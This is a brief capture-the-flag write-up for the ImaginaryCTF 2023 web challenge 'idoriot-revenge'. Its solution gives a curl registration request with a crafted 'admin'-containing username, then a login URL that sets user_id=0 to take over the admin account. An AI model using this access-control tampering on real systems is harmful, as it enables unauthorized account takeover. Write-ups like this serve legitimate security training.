# idoriot-revenge
**Category:** Web
**Difficulty:** Easy
**Author:** tirefire

## Description

The idiot who made it, made it so bad that the first version was super easy. It was changed to fix it.

## Distribution

- link

## Solution

- curl -iL 'http://2023.imaginaryctf.org/idoriot/register.php' -X POST -H 'Content-Type: application/x-www-form-urlencoded' --data-raw 'username=aaaaaaadminaaaa&password=somethingelse'
- now log in as aaaaaaadminaaaa:somethingelse and pass the url parameter http://2023.imaginaryctf.org/idoriot/login.php?user_id=0
